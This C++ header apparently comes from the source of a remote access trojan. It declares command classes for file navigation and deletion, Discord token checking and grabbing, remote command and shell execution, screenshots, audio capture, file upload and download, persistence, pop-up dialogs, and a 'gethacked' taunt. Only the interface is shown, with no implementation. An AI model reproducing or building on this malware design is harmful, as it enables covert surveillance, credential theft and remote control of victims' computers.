#ifndef COMMANDS_H
#define COMMANDS_H

#include <string>
#include <vector>
#include <cstdint>
#include <optional>
#include "command.h"

class Controller;

enum class NavigationCommandEnum {
    ls, cd, pwd, rm
};

enum class AudioCommandEnum {
    start, stop, list
};

enum class DiscordCommandEnum {
    check, grab
};

enum class ShowoffCommandEnum {
    gethacked, hi
};

#define COMMAND(num, name, ...) \
    class name##Command : public Command<num, __VA_ARGS__> { \
    public: \
        int execute(Controller&, ##__VA_ARGS__) override; \
    }

// navigation.cpp
COMMAND(3, Navigation, NavigationCommandEnum, std::string);
// discord.cpp
COMMAND(4, Discord, DiscordCommandEnum);
// exec.cpp
COMMAND(5, Exec, std::string, bool);
// screen.cpp
COMMAND(6, Screenshot);
// audio.cpp
COMMAND(7, Audio, AudioCommandEnum);
// files.cpp
COMMAND(8, DownloadFile, std::string);
COMMAND(9, UploadFile, std::string, std::vector<uint8_t>);
// persistence.cpp
COMMAND(10, Persist, std::string);
// dialog.cpp
COMMAND(11, Dialog, uint32_t, std::string, std::string);
// showoff.cpp
COMMAND(12, Showoff, ShowoffCommandEnum);
// shellexec.cpp
COMMAND(13, ShellExecute, std::optional<std::string>, std::optional<std::string>, std::optional<std::string>, std::optional<std::string>, std::optional<int>);

#endif